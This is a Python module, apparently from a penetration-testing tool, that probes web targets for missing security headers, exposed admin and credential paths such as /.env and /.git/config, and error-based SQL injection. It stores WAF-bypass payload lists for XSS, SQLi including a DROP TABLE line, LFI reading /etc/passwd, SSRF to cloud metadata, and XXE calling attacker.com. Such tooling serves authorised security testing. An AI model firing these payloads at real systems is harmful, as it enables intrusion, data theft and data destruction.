"""
Web / WAF Module — XSS, SQLi, WAF bypass analysis
"""

import asyncio
import re
import aiohttp
import ssl as ssl_lib
from core.orchestrator import EngagementState, Finding, Severity


# WAF bypass payload sets per WAF type
WAF_BYPASS_PAYLOADS = {
    "Cloudflare": {
        "xss": [
            "<svg/onload=alert(1)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;49&#41;>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        ],
        "sqli": [
            "' OR 1=1--",
            "' /*!50000OR*/ 1=1--",
            "' OR 'x'='x",
            "1' /*!AND*/ 1=1--",
        ],
    },
    "ModSecurity": {
        "xss": [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
            "<<SCRIPT>alert(1)//<</SCRIPT>",
        ],
        "sqli": [
            "' OR 1=1 #",
            "admin'--",
            "' UNION SELECT null,null--",
        ],
    },
    "Generic": {
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><img src=x onerror=alert(document.domain)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
        ],
        "sqli": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "1; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
        ],
        "lfi": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd%00",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        ],
        "ssrf": [
            "http://127.0.0.1:80",
            "http://localhost/admin",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]:80",
            "http://0.0.0.0:80",
        ],
    },
}

SENSITIVE_ENDPOINTS = [
    "/admin", "/admin/login", "/administrator", "/wp-admin",
    "/.env", "/.git/config", "/config.php", "/config.yml",
    "/backup.zip", "/backup.sql", "/db.sql",
    "/api/v1/users", "/api/users", "/api/admin",
    "/phpmyadmin", "/phpinfo.php",
    "/actuator", "/actuator/env", "/actuator/health",
    "/console", "/h2-console",
    "/.htpasswd", "/.htaccess",
    "/web.config", "/appsettings.json",
    "/robots.txt", "/sitemap.xml",
    "/.well-known/security.txt",
]

# ── Endpoint classification sets ──────────────────────────────────────────────

# Always INFO — standard, expected public paths
INFO_PATHS = {"/robots.txt", "/sitemap.xml", "/.well-known/security.txt"}

# MEDIUM if 200+text/html (likely a login page), HIGH if 200+non-html
ADMIN_PATH_PREFIXES = (
    "/phpmyadmin", "/admin", "/administrator", "/wp-admin",
    "/console", "/h2-console", "/dashboard",
)

# Non-HTML extensions that are suspicious even inside text/html responses
NON_HTML_EXTENSIONS = (
    ".zip", ".sql", ".bak", ".tar", ".gz", ".env",
    ".config", ".yml", ".yaml", ".json", ".xml",
    ".log", ".key", ".pem",
)

# Keywords that elevate severity to CRITICAL
CRITICAL_KEYWORDS = (".env", ".git", "backup", "db.sql")

# Expected body keywords per admin-panel path prefix.
# A 200 response that contains none of these is treated as a catch-all false
# positive — the server is returning its generic error/home page for that path.
ADMIN_KEYWORDS: dict[str, list[str]] = {
    "/phpmyadmin":  ["phpmyadmin", "mysql", "pma"],
    "/console":     ["console", "rails", "groovy", "shell"],
    "/h2-console":  ["h2", "java", "H2 Console"],
    "/wp-admin":    ["wordpress", "wp-login", "WordPress"],
    "/actuator":    ["actuator", "{"],
    "/swagger":     ["swagger", "openapi", "Swagger"],
}

SECURITY_HEADERS = {
    "X-Frame-Options": "Clickjacking protection",
    "Content-Security-Policy": "XSS/injection policy",
    "X-XSS-Protection": "Browser XSS filter",
    "X-Content-Type-Options": "MIME sniffing protection",
    "Strict-Transport-Security": "HTTPS enforcement",
    "Referrer-Policy": "Referrer info control",
    "Permissions-Policy": "Feature policy",
}


async def check_endpoint(session, base_url: str, path: str) -> dict:
    """Probe a single path. Returns actual body byte count, not Content-Length header.
    Also returns the first 8 KB of decoded body text for keyword verification."""
    url = base_url.rstrip("/") + path
    try:
        async with session.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            ct = resp.headers.get("Content-Type", "").lower()
            # Read up to 512 KB — gives accurate size for chunked responses
            # while preventing memory exhaustion on large files.
            body = await resp.content.read(512 * 1024)
            return {
                "url": url,
                "status": resp.status,
                "size": resp.headers.get("Content-Length", "?"),
                "content_type": ct,
                "content_length": len(body),   # actual bytes, not header
                "body_text": body[:8192].decode("utf-8", errors="ignore"),
                "interesting": resp.status in (200, 301, 302, 403, 401),
            }
    except Exception:
        return {
            "url": url, "status": 0, "content_type": "",
            "content_length": 0, "body_text": "", "interesting": False,
        }


async def get_baseline_body_size(session, base_url: str) -> int:
    """Fetch a guaranteed-nonexistent path to establish a soft-404 baseline.

    Returns the actual body byte count, or -1 if the request fails.
    Used to detect servers that return 200 OK with identical HTML for every URL.
    """
    canary_url = base_url.rstrip("/") + "/this-path-does-not-exist-12345-godseye"
    try:
        async with session.get(
            canary_url,
            allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=5),
        ) as resp:
            body = await resp.content.read(512 * 1024)
            return len(body)
    except Exception:
        return -1  # baseline unavailable — skip comparison


async def get_homepage_body_size(session, base_url: str) -> int:
    """Fetch the homepage (GET /) to establish a content baseline.

    Returns the actual body byte count, or -1 if the request fails.
    Catches SPAs and catch-all proxies that serve the same HTML for every URL —
    these may differ from the canary baseline but still match the homepage body.
    """
    homepage_url = base_url.rstrip("/") + "/"
    try:
        async with session.get(
            homepage_url,
            allow_redirects=True,
            timeout=aiohttp.ClientTimeout(total=5),
        ) as resp:
            body = await resp.content.read(512 * 1024)
            return len(body)
    except Exception:
        return -1  # baseline unavailable — skip comparison


async def check_security_headers(session, url: str) -> dict:
    missing = []
    present = []
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            headers = {k.lower(): v for k, v in resp.headers.items()}
            for h, desc in SECURITY_HEADERS.items():
                if h.lower() in headers:
                    present.append(h)
                else:
                    missing.append({"header": h, "description": desc})
    except Exception as e:
        return {"error": str(e), "missing": [], "present": []}
    return {"missing": missing, "present": present}


async def test_basic_sqli(session, url: str) -> list:
    findings = []
    error_patterns = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
        r"valid MySQL result", r"check the manual that corresponds",
        r"ORA-\d{5}", r"Oracle.*error", r"PLS-\d{5}",
        r"Unclosed quotation mark", r"Microsoft OLE DB Provider for ODBC",
        r"ADODB\.Field error", r"SQLServer JDBC Driver",
        r"PostgreSQL.*ERROR", r"psycopg2",
    ]

    payloads = ["'", "''", "' OR '1'='1", "1' AND SLEEP(1)--"]
    params_to_test = ["id", "user", "username", "search", "q", "name", "page"]

    for param in params_to_test[:3]:  # limit for speed
        for payload in payloads[:2]:
            test_url = f"{url}?{param}={payload}"
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    body = await resp.text(errors="ignore")
                    for pattern in error_patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append({
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "error_pattern": pattern,
                            })
                            break
            except Exception:
                pass

    return findings


async def run_web_analysis(state: EngagementState, console=None) -> dict:
    recon = state.recon_data
    web_results = recon.get("web", {})

    if not web_results:
        state.add_note("No web services found, skipping web module")
        return {}

    def log(msg):
        if console:
            console.print(f"  [dim]→[/dim] {msg}")

    def _add(finding):
        if not any(x.title == finding.title for x in state.findings):
            state.add_finding(finding)

    ssl_ctx = ssl_lib.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl_lib.CERT_NONE

    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    web_data = {}

    async with aiohttp.ClientSession(
        connector=connector,
        headers={"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}
    ) as session:

        for port, winfo in web_results.items():
            base_url = winfo.get("url", "")
            if not base_url:
                continue

            port_data = {
                "base_url": base_url,
                "technologies": winfo.get("technologies", []),
                "waf": winfo.get("waf"),
                "security_headers": {},
                "endpoints": [],
                "sqli_findings": [],
                "waf_payloads": {},
            }

            # Security headers
            log(f"Checking security headers: {base_url}")
            port_data["security_headers"] = await check_security_headers(session, base_url)

            missing_hdrs = port_data["security_headers"].get("missing", [])
            if len(missing_hdrs) >= 3:
                _add(Finding(
                    title=f"Missing security headers ({len(missing_hdrs)}) on {base_url}",
                    severity=Severity.MEDIUM,
                    description=f"Missing: {', '.join(h['header'] for h in missing_hdrs[:5])}",
                    evidence=f"Headers not present in HTTP response",
                    mitre_tactic="Initial Access",
                    mitre_technique="T1190 - Exploit Public-Facing Application",
                    remediation="Add missing security headers in web server config.",
                    phase="web",
                ))

            # Soft-404 baseline — one canary request per host
            log(f"Fetching soft-404 baseline for {base_url}...")
            baseline_size  = await get_baseline_body_size(session, base_url)
            homepage_size  = await get_homepage_body_size(session, base_url)

            # Endpoint enumeration
            log(f"Endpoint enumeration ({len(SENSITIVE_ENDPOINTS)} paths)...")
            tasks = [check_endpoint(session, base_url, ep) for ep in SENSITIVE_ENDPOINTS]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            found_endpoints = [r for r in results if isinstance(r, dict) and r.get("interesting") and r.get("status", 0) != 404]
            port_data["endpoints"] = found_endpoints

            for ep in found_endpoints:
                if ep.get("status") != 200:
                    continue

                path        = ep["url"].replace(base_url, "") or "/"
                ct          = ep.get("content_type", "")
                body_len    = ep.get("content_length", 0)
                is_html     = "text/html" in ct
                has_bin_ext = path.lower().endswith(NON_HTML_EXTENSIONS)
                _baseline_note = ""
                if baseline_size >= 0:
                    _baseline_note += f" | canary: {baseline_size}B"
                if homepage_size >= 0:
                    _baseline_note += f" | homepage: {homepage_size}B"
                evidence    = (f"HTTP {ep['status']} | "
                               f"Content-Type: {ct or 'unknown'} | "
                               f"Body: {body_len} bytes{_baseline_note}")

                # ── Content-type / extension mismatch — always a false positive ──
                # A real backup.zip or config.yml would never be served as
                # text/html; skip immediately when the server's catch-all
                # template answers for a file-extension path.
                if is_html and has_bin_ext:
                    continue

                # ── INFO paths — always informational ──────────────────────────
                if path in INFO_PATHS:
                    _add(Finding(
                        title=f"Informational endpoint: {path}",
                        severity=Severity.INFO,
                        description=f"Standard public path accessible: {ep['url']}",
                        evidence=evidence,
                        mitre_tactic="Discovery",
                        mitre_technique="T1083 - File and Directory Discovery",
                        remediation="Ensure no sensitive data is disclosed in this file.",
                        phase="web",
                    ))
                    continue

                # ── Admin paths — baseline-aware soft-404 filtering ────────────
                if path.startswith(ADMIN_PATH_PREFIXES):
                    if is_html:
                        # Compare body size against the canary-path baseline.
                        # < 1000-byte difference → server returns the same HTML
                        # for all URLs (catch-all / soft-404) → skip.
                        if baseline_size >= 0 and abs(body_len - baseline_size) < 1000:
                            continue
                        # Compare against homepage body — SPAs and catch-all
                        # proxies serve the same shell HTML for every route;
                        # skip if sizes match closely.
                        if homepage_size >= 0 and abs(body_len - homepage_size) < 1000:
                            continue
                        # Keyword verification — only fire if the body actually
                        # looks like the expected admin panel, not a generic page.
                        body_text = ep.get("body_text", "").lower()
                        _kw_match = True
                        for kw_prefix, kw_list in ADMIN_KEYWORDS.items():
                            if path.startswith(kw_prefix):
                                _kw_match = any(kw.lower() in body_text for kw in kw_list)
                                break
                        if not _kw_match:
                            continue
                        sev  = Severity.MEDIUM
                        desc = (f"Admin panel returning distinct HTML content "
                                f"(likely a real login page): {ep['url']}")
                    else:
                        sev  = Severity.HIGH
                        desc = (f"Admin panel returning non-HTML content "
                                f"(possible direct access): {ep['url']}")
                    _add(Finding(
                        title=f"Admin panel accessible: {path}",
                        severity=sev,
                        description=desc,
                        evidence=evidence,
                        mitre_tactic="Discovery",
                        mitre_technique="T1083 - File and Directory Discovery",
                        remediation=(
                            "Restrict admin paths via IP allowlist or "
                            "strong authentication."
                        ),
                        phase="web",
                    ))
                    continue

                # ── All other 200s — filter HTML false positives ───────────────
                # Skip if HTML response with no binary extension clues
                # (soft-404 / redirect page masquerading as 200)
                if is_html and not (has_bin_ext and body_len > 5000):
                    continue

                # Homepage comparison — skip if response matches homepage body
                # size (SPA / catch-all proxy serving same shell for all URLs).
                if homepage_size >= 0 and abs(body_len - homepage_size) < 1000:
                    continue

                # Real finding: non-HTML content-type OR binary ext + large body
                sev = (Severity.CRITICAL
                       if any(kw in path for kw in CRITICAL_KEYWORDS)
                       else Severity.HIGH)
                _add(Finding(
                    title=f"Sensitive endpoint exposed: {path}",
                    severity=sev,
                    description=f"Sensitive path is publicly accessible: {ep['url']}",
                    evidence=evidence,
                    mitre_tactic="Discovery",
                    mitre_technique="T1083 - File and Directory Discovery",
                    remediation=(
                        "Restrict access or remove sensitive files from the "
                        "web root. Apply server-level deny rules."
                    ),
                    phase="web",
                ))

            # Basic SQLi test
            log(f"Basic SQLi probe...")
            port_data["sqli_findings"] = await test_basic_sqli(session, base_url)
            for sqli in port_data["sqli_findings"]:
                _add(Finding(
                    title=f"Possible SQL injection: {sqli['param']} parameter",
                    severity=Severity.CRITICAL,
                    description=f"SQL error triggered at {sqli['url']}",
                    evidence=f"Payload: {sqli['payload']} | Pattern: {sqli['error_pattern']}",
                    mitre_tactic="Initial Access",
                    mitre_technique="T1190 - Exploit Public-Facing Application",
                    remediation="Use parameterized queries / prepared statements.",
                    cvss=9.8,
                    phase="web",
                ))

            # WAF bypass payloads suggestion
            waf = winfo.get("waf") or "Generic"
            payloads_key = waf if waf in WAF_BYPASS_PAYLOADS else "Generic"
            port_data["waf_payloads"] = WAF_BYPASS_PAYLOADS[payloads_key]

            web_data[str(port)] = port_data

    state.web_data = web_data
    state.add_note(f"Web analysis complete on {len(web_data)} ports")
    return web_data
